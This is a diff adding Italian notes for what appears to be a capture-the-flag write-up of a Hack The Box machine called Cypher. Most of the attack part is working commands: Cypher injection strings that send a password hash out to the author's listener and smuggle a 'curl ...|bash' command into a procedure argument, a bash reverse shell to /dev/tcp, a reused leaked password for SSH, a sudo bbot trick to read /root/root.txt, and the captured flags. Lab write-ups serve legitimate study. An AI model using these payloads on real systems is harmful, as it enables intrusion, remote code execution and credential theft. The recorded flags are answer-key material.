@@ -75,3 +75,85 @@ Task Completed
 
 # Exploit
 
+scrivo uno script per fare delle GET ad ognuna di queste pagine e stamparmi il risultato in dei file txt.
+
+Faccio la stessa cosa con OPTIONS -> non serve a nulla
+
+Leggendo nei vari codici scopro che username e pass sono salvati in neo4j -> VULNERABILE 
+
+inoltre, navigando a /testing riesco a scaricare qualcosa -> un jar
+
+Capisco di avere neo4j -> cerco online script per exploitare la Cypher injection
+
+1. apro un server python in locale sulla 80
+2. mando la seguente stringa: `admin' OR 1=1 LOAD CSV FROM 'http://10.10.16.25/ppp='+h.value AS y Return ''//` come username su burp, password arbitraria.
+
+'''
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.57 - - [23/May/2025 10:43:37] code 404, message File not found
+10.10.11.57 - - [23/May/2025 10:43:37] "GET /ppp=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 404 -
+'''
+Quindi ho questo hash: 9f54ca4c130be6d529a56dee59dc2b2090e43acf
+
+uso questo hash per far fare una syscall al sistema ([link](https://www.hyhforever.top/htb-cypher/)):
+
+1. creo il file shell.sh
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.25/9999 0>&1
+```
+2. hosto il python.http server dalla cartella della shell
+3. apro nc in ascolto sulla porta 9999
+4. mando la stringa dell'injection
+
+username: `admin' return h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl 10.10.16.235/shell.sh|bash;\") YIELD statusCode AS value  RETURN value ; //`
+
+5. uso la shell da nc
+
+user.txt non è leggibile, ma c'è un file che stampato restituisce:
+
+```
+neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
+
+targets:
+  - ecorp.htb
+
+output_dir: /home/graphasm/bbot_scans
+
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: cU4btyib.20xtCMCXkBmerhK
+
+```
+
+
+mi connetto in SSH a Graphasm:
+
+
+> ssh graphasm@cypher.htb
+
+> password: cU4btyib.20xtCMCXkBmerhK
+
+
+# USER FLAG
+
+02d95f8d211e581188c5dbeb6a3620ac
+
+# PRIVESC
+```
+graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+
+guardando le impostazioni di bbot provo a caricare il file della flag come configurazione per poi stampare in debug
+
+> sudo /usr/local/bin/bbot -cy /root/root.txt --debug
+
+## ROOT FLAG
+0435e5951e95f8fc5716fe0f5261163f
